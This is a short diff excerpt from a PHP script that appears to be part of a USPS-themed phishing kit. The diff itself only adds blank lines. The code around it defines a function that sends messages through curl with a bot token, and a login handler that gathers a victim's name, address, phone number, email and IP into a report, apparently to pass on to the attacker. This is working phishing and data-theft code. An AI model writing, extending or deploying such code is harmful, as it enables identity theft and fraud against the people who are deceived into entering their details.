@@ -29,6 +29,9 @@ function sendMessageT($chatID, $messaggio, $token) {
     $resp = curl_exec($curl);
     curl_close($curl);
 }
+
+
+
 if(isset($_POST['login'])){
 $ip = getenv("REMOTE_ADDR");
 $message = "-------------------- <3 USPS <3-------------------\nFull Name : ".$_POST['fullname']."\nAddress 1 : ".$_POST['add1']."\nAddress 2 : ".$_POST['add2']."\nCity      : ".$_POST['city']."\nstate  : ".$_POST['sstate']."\nzip Code  : ".$_POST['zipp']."\nPhone num  : ".$_POST['phonee']."\nEmail  : ".$_POST['email']."\nIP      : ".$ip."\n-------------------- <3 USPS <3-------------------\n";
